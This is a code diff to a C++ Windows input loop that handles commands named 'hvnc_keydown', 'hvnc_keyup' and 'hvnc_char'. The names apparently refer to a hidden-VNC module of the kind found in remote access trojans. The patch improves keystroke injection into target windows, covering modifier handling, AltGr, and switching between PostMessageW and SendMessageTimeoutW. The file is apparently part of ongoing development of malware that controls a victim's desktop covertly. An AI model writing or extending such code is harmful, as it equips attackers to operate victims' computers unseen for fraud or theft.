@@ -993,22 +993,40 @@ static void input_loop() {
             if (!hTarget || !IsWindow(hTarget)) hTarget = WindowFromPoint(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) continue;
 
+            bool isMod = (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+                          vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ||
+                          vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT);
+
             if (action == "hvnc_keydown") {
                 if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_ctrlDown = true;
                 if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_altDown = true;
                 if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_shiftDown = true;
 
-                UINT msg = (g_altDown || vk == VK_F10) ? WM_SYSKEYDOWN : WM_KEYDOWN;
-                PostMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, false, g_altDown));
+                // WM_SYSKEYDOWN is only used when Alt is down WITHOUT Ctrl (to not break AltGr)
+                UINT msg = (g_altDown && !g_ctrlDown || vk == VK_F10) ? WM_SYSKEYDOWN : WM_KEYDOWN;
+                LPARAM lp = key_lparam((WORD)vk, false, g_altDown);
+
+                if (isMod || g_ctrlDown || g_altDown)
+                    SendMessageTimeoutW(hTarget, msg, (WPARAM)vk, lp, SMTO_ABORTIFHUNG, 250, NULL);
+                else
+                    PostMessageW(hTarget, msg, (WPARAM)vk, lp);
             } else if (action == "hvnc_keyup") {
                 if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_ctrlDown = false;
                 if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_altDown = false;
                 if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_shiftDown = false;
 
-                UINT msg = (g_altDown || vk == VK_F10) ? WM_SYSKEYUP : WM_KEYUP;
-                PostMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, true, g_altDown));
+                UINT msg = (g_altDown && !g_ctrlDown || vk == VK_F10) ? WM_SYSKEYUP : WM_KEYUP;
+                LPARAM lp = key_lparam((WORD)vk, true, g_altDown);
+
+                if (isMod || g_ctrlDown || g_altDown)
+                    SendMessageTimeoutW(hTarget, msg, (WPARAM)vk, lp, SMTO_ABORTIFHUNG, 250, NULL);
+                else
+                    PostMessageW(hTarget, msg, (WPARAM)vk, lp);
             } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+                if (g_ctrlDown || g_altDown)
+                    SendMessageTimeoutW(hTarget, WM_CHAR, (WPARAM)vk, 1, SMTO_ABORTIFHUNG, 250, NULL);
+                else
+                    PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
             g_forceFullFrame = true;
             continue;
